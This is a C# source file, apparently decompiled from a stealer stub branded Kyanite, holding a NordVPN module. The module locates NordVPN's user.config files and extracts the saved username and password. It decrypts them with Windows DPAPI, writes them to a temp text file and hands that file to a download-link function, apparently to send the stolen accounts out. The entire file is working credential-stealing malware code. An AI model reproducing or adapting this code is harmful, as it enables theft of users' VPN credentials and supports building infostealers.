using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Stub
{
	// Token: 0x02000032 RID: 50
	internal class NordVPN
	{
		// Token: 0x0600009B RID: 155 RVA: 0x00002925 File Offset: 0x00000B25
		public static string GrabNord()
		{
			File.WriteAllText(Program.tempFolder + "\\NordAccounts.txt", "Kyanite\n");
			NordVPN.StealVPN();
			return NordVPN.GetVPNFile();
		}

		// Token: 0x0600009C RID: 156 RVA: 0x000076AC File Offset: 0x000058AC
		public static string GetVPNFile()
		{
			string result;
			try
			{
				result = Functions.CreateDownloadLink(Program.tempFolder + "\\NordAccounts.txt");
			}
			catch
			{
				result = "No NordVPN Save";
			}
			return result;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x000076EC File Offset: 0x000058EC
		public static void StealVPN()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(folderPath, "NordVPN"));
			if (!directoryInfo.Exists)
			{
				Console.WriteLine("NordVPN directory not found!");
				return;
			}
			foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories("NordVpn.exe*"))
			{
				foreach (DirectoryInfo directoryInfo3 in directoryInfo2.GetDirectories())
				{
					string text = Path.Combine(directoryInfo3.FullName, "user.config");
					if (File.Exists(text))
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
						string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
						if (innerText != null && !string.IsNullOrEmpty(innerText))
						{
							File.AppendAllText(Program.tempFolder + "\\NordAccounts.txt", "User: " + NordVPN.nordDecode(innerText));
						}
						if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
						{
							File.AppendAllText(Program.tempFolder + "\\NordAccounts.txt", "Pass:" + NordVPN.nordDecode(innerText2));
						}
					}
				}
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00007830 File Offset: 0x00005A30
		private static string nordDecode(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
